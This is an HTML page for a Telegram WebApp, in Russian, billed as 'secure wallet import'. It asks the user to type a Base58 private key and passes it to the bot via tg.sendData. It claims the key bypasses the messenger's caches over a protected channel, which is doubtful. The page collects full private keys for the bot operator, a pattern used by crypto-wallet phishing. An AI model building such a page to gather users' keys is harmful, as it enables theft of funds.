<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Импорт кошелька</title>
    <!-- Подключаем официальный скрипт Telegram WebApp API -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #181818);
            color: var(--tg-theme-text-color, #ffffff);
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 80vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 10px;
            font-size: 20px;
            color: var(--tg-theme-button-color, #2481cc);
        }
        p {
            font-size: 14px;
            color: var(--tg-theme-hint-color, #aaaaaa);
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            border: 1px solid var(--tg-theme-hint-color, #444);
            border-radius: 8px;
            background-color: var(--tg-theme-secondary-bg-color, #242424);
            color: var(--tg-theme-text-color, #ffffff);
            font-size: 16px;
            margin-bottom: 20px;
            outline: none;
        }
        input[type="password"]:focus {
            border-color: var(--tg-theme-button-color, #2481cc);
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:active {
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🛡️ Безопасный импорт кошелька</h2>
        <p>Ваш приватный ключ передается напрямую в бота по защищенному каналу, минуя облачные кэши чатов мессенджера.</p>
        <input type="password" id="pkey" placeholder="Введите Private Key (Base58)">
        <button onclick="sendKey()">Подтвердить</button>
    </div>

    <script>
        // Инициализация WebApp
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand(); // Разворачиваем на весь экран для удобства

        function sendKey() {
            const pkeyVal = document.getElementById('pkey').value.trim();
            if (!pkeyVal) {
                alert("Пожалуйста, введите приватный ключ.");
                return;
            }
            // Передаем приватный ключ обратно боту и закрываем WebApp
            tg.sendData(pkeyVal);
        }
    </script>
</body>
</html>
